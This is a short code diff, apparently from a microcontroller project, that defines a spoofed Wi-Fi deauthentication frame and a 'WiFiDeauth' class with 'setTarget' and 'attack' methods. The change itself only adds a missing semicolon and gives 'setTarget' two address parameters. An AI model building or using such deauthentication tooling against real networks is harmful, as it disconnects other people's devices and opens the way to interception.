@@ -11,12 +11,12 @@ uint8_t deauthPacket[26] = {
   0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,       // BSSID (spoofed AP)
   0x00, 0x00,                               // Sequence Number
   0x07, 0x00                                // Reason Code (7 = Class 3 Frame Received from Nonassociated STA)
-}
+};
 
 class WiFiDeauth {
   public:
     void setup();
-    void setTarget();
+    void setTarget(uint8_t*, uint8_t*);
     void attack();
 };
 
